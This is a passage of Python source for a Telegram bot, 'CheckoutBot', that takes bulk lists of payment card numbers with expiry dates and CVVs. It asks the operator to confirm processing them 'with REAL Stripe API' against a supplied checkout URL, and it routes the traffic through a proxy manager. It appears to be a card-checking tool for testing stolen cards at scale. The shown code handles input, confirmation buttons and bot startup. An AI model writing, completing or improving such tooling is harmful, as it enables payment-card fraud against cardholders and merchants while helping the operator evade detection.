                else:
                    invalid.append(line)
            
            if not cards:
                await update.message.reply_text(
                    "❌ No valid cards found. Format: `4111111111111111|12|25|123`",
                    parse_mode='Markdown'
                )
                return
            
            # Create confirmation keyboard
            keyboard = [
                [
                    InlineKeyboardButton("✅ Process", callback_data="process_cards"),
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            context.user_data['cards'] = cards
            context.user_data['invalid_count'] = len(invalid)
            
            summary = f"*URL:* `{url}`\n"
            summary += f"*Valid cards:* {len(cards)}\n"
            if invalid:
                summary += f"*Invalid lines:* {len(invalid)}\n\n"
            summary += "\nProcess these cards with REAL Stripe API?"
            
            await update.message.reply_text(
                summary,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "cancel":
            context.user_data.clear()
            await query.edit_message_text("❌ Cancelled")
            return
        
        if query.data == "process_cards":
            await self.process_cards(update, context)
    
    async def run(self):
        """Run the bot"""
        await self.app.initialize()
        await self.app.start()
        
        print("Bot started. Press Ctrl+C to stop.")
        await self.app.updater.start_polling()
        
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            await self.shutdown()
    
    async def shutdown(self):
        """Clean shutdown"""
        await self.proxy_manager.close_all()
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()

# ============= MAIN =============
async def main():
    """Main entry point"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Please set your BOT_TOKEN in the script!")
        return
    
    bot = CheckoutBot(BOT_TOKEN)
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())